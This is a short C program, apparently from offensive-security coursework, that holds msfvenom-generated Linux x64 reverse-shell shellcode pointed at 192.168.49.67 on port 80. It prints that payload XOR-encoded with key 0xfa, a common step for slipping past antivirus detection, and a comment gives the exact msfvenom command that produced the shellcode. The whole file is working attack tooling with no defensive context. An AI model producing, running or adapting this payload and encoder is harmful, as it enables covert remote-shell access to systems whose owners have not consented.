#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// To compile:
// gcc simpleXORencoder.c -o simpleXORencoder

// msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.67 LPORT=80 -f c
unsigned char buf[] =
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x00\x50\xc0\xa8\x31\x43\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

int main (int argc, char **argv)
{
        int key = 250;
        int buf_len = (int) sizeof(buf);

        printf("XOR payload (key 0xfa):\n");

        for(int i=0; i<buf_len; i++)
        {
                printf("\\x%02X",buf[i]^key);
        }

        return 0;
}